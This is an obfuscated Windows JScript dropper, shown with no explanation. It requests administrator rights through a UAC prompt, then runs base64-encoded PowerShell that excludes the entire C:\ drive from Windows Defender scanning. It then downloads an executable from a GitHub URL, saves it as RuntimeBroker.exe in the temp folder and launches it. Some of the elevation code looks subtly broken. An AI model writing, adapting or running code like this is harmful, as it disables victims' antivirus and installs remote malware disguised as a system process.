(function() {
    var _0x1a2b = function(a, b) {
        var c = function(d) {
            while (--d) { a.push(a.shift()); }
        };
        c(++b);
        return a;
    };

    var _0x2b3c = _0x1a2b(['Shell.Application', 'Wscript.Shell', 'run', 'Arguments', 'Exists', 'FullName', 'ScriptFullName', 'runas'], 0);

    function _0x3d4e() {
        if (!WScript[_0x2b3c[3]][_0x2b3c[4]]('elevate')) {
            new ActiveXObject(_0x2b3c[0])[_0x2b3c[6]](_0x2b3c[5], '"' + WScript[_0x2b3c[6]] + '" /elevate', '', _0x2b3c[7], 1);
            WScript.Quit();
        }
    }

    function _0x4e5f() {
        _0x3d4e();
        var _0x5f6g = new ActiveXObject(_0x2b3c[1]);
        var _0x6h7i = [
            "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA",
            "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==",
            "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcwBwAG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG9AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA="
        ];

        _0x6h7i.forEach(function(cmd) {
            _0x5f6g[_0x2b3c[2]]("powershell -enc " + cmd, 0, false);
        });
    }

    _0x4e5f();
})();
